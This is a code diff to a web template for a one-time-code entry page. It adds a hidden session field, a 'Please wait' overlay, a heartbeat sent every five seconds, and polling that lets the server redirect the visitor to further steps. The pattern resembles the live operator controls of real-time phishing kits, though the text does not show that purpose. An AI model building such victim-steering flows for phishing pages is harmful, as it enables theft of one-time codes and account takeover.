@@ -613,6 +613,7 @@
   <form method="POST" action="/p/<%= page.slug %>/verify" id="otpForm">
     <input type="hidden" name="_csrf" value="<%= csrfToken %>">
     <input type="hidden" name="_step" value="<%= pageContent.slug || 'verify' %>">
+    <input type="hidden" name="_sid" id="_sid_otp" value="">
     <div class="otp-wrap" id="otpWrap">
       <% for (let i = 0; i < (pageContent.otp_length || 6); i++) { %>
         <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
@@ -684,6 +685,32 @@
     } catch { btn.textContent = 'Error'; }
     setTimeout(() => { btn.disabled = false; btn.textContent = 'Resend Code'; }, 30000);
   }
+</script>
+<script>
+(function(){
+  var sid = '';
+  try { sid = sessionStorage.getItem('_lbsid') || ''; } catch(e){}
+  if (!sid) { try { sid = Math.random().toString(36).slice(2)+Date.now().toString(36); sessionStorage.setItem('_lbsid', sid); } catch(e){} }
+  var f = document.getElementById('_sid_otp'); if(f) f.value = sid;
+  // overlay
+  var ov = document.createElement('div');
+  ov.id='_lbov'; ov.style.cssText='display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:9999;align-items:center;justify-content:center;flex-direction:column;gap:18px';
+  ov.innerHTML='<div style="width:52px;height:52px;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:_lbspin 0.8s linear infinite"></div><p style="color:#fff;font-size:1rem;margin:0;font-family:sans-serif">Please wait\u2026</p><style>@keyframes _lbspin{to{transform:rotate(360deg)}}</style>';
+  document.body.appendChild(ov);
+  // heartbeat
+  var slug = '<%= page.slug.replace(/['"\\<>]/g,"") %>';
+  setInterval(function(){ try{ fetch('/p/'+slug+'/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sid,step:'otp'}),keepalive:true}); }catch(e){} }, 5000);
+  // poll
+  setInterval(function(){
+    if(!sid) return;
+    fetch('/p/'+slug+'/poll?sid='+encodeURIComponent(sid)).then(function(r){return r.json();}).then(function(d){
+      if(!d.step) return;
+      ov.style.display='flex';
+      var dest = (d.step==='HOME') ? '/' : (d.step==='NEXT') ? '/p/'+slug+'/next' : '/p/'+slug+'/'+d.step;
+      setTimeout(function(){ window.location.href=dest; }, 400);
+    }).catch(function(){});
+  }, 2000);
+})();
 </script>
 </body>
 </html>
